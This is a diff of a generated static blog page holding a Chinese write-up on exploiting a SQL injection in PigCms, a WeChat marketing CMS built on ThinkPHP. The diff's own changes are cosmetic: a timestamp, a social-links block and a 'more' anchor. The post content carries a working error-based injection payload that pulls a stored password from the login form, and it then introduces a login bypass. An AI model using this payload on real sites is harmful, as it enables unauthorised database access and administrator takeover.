@@ -26,7 +26,7 @@
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/1574161-f9b718d556f91f9c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/1574161-c37ce9df274b7dd1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2018-05-29T09:54:06.444Z">
+<meta property="og:updated_time" content="2018-05-30T11:26:37.750Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PigCms注入漏洞另类利用姿势 | 拥雪待春色">
 <meta name="twitter:description" content="##0x01 前言 PigCms（又称小猪CMS）是一个基于php+mysql的多用户微信营销源码程序，由合肥彼岸互联信息技术有限公司开发，是国内使用最多、功能最强大、性能最稳定的多用户微信营销系统平台源码,目前国内大多数微信营销平台都是pigcms或由pigcms二次开发而成。因某次测试遇到该CMS，遂对该CMS进行分析，发现网上存在相关漏洞审计报告。于是参考网上相关报告进行利用测试，本文记录了">
@@ -136,6 +136,45 @@ classes that you can use:
 
 
 
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/wh0amis" title="Huno on GitHub">
+          <i class='icon icon-social-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+
+    <!-- China social icon -->
+    <!--
+    
+      <li class="navigation__item">
+        <a href="" title="">
+          <i class='icon cs-icon-douban'></i>
+          <span class="label">Douban</span>
+        </a>
+      </li>
+
+      <li class="navigation__item">
+        <a href="" title="">
+          <i class='icon cs-icon-weibo'></i>
+          <span class="label">Weibo</span>
+        </a>
+      </li>
+
+    -->
+
+
+
+  </ul>
+</nav>
+
+
+
         </div>
 
       </div>
@@ -180,7 +219,7 @@ classes that you can use:
   </header>
 
   <section id="post-content" class="article-content post">
-    <p>##0x01 前言<br> PigCms（又称小猪CMS）是一个基于php+mysql的多用户微信营销源码程序，由合肥彼岸互联信息技术有限公司开发，是国内使用最多、功能最强大、性能最稳定的多用户微信营销系统平台源码,目前国内大多数微信营销平台都是pigcms或由pigcms二次开发而成。<br>因某次测试遇到该CMS，遂对该CMS进行分析，发现网上存在相关漏洞审计报告。于是参考网上相关报告进行利用测试，本文记录了利用过程中遇到的一些坑和姿势。</p>
+    <p>##0x01 前言<br> PigCms（又称小猪CMS）是一个基于php+mysql的多用户微信营销源码程序，由合肥彼岸互联信息技术有限公司开发，是国内使用最多、功能最强大、性能最稳定的多用户微信营销系统平台源码,目前国内大多数微信营销平台都是pigcms或由pigcms二次开发而成。<br>因某次测试遇到该CMS，遂对该CMS进行分析，发现网上存在相关漏洞审计报告。于是参考网上相关报告进行利用测试，本文记录了利用过程中遇到的一些坑和姿势。<br><a id="more"></a></p>
 <p>##0x02 SQL注入<br> 由于PigCms是基于ThinkPHP二次开发。所以存在ThinkPHP相关漏洞。根据漏洞描述。在登录处即可进行SQL注入。<br>漏洞详情：<a href="https://www.secpulse.com/archives/42886.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/42886.html</a><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[0]=%3D'__test__') or (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> pigcms_user <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) #<span class="keyword">between</span>&amp;username[<span class="number">1</span>]=freedomzz&amp;<span class="keyword">password</span>=<span class="number">123123</span>&amp;verifycode2=<span class="number">7218</span>&amp;__hash__=<span class="number">3e9</span>fde7441cc55bf46afe7f8361af205_3dd5ac82b216c5bf00b8207d99a7f76c</span><br></pre></td></tr></table></figure></p>
 <p>但查询出来后的密码无法解密，有没有其他的方法绕过呢，答案当然是有的，由于任何参数均可以注入，所以可以再后台登录处采用联合查询的方式，绕过登录的判断。从而进入后台。先来看看后台代码是怎么判断的</p>
 <p>AdminAction.class.php<br><img src="https://upload-images.jianshu.io/upload_images/1574161-f9b718d556f91f9c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
